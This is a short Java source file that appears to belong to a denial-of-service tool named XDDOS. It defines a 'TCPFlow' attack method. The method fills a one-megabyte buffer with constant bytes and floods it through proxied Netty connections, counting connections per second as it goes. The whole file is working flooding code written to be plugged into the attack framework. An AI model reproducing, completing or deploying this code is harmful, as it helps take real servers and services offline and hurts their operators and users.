package XD.XDDOS.methods.impl;

import XD.XDDOS.methods.IMethod;
import XD.XDDOS.utils.NettyBootstrap;
import XD.XDDOS.utils.proxy.ProxyLoader.Proxy;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

public class TCPFlow implements IMethod{
    private byte max = Byte.MAX_VALUE;
    private byte[] lol = new byte[1000000];

    public TCPFlow(){
        for(int i = 0; i < lol.length ; i++) {
            lol[i] = max;
        }
    }

    @Override
    public void accept(Channel channel, Proxy p) {
        channel.writeAndFlush(Unpooled.buffer().writeBytes(this.lol));
        NettyBootstrap.integer++;
        NettyBootstrap.triedCPS++;
    }
}
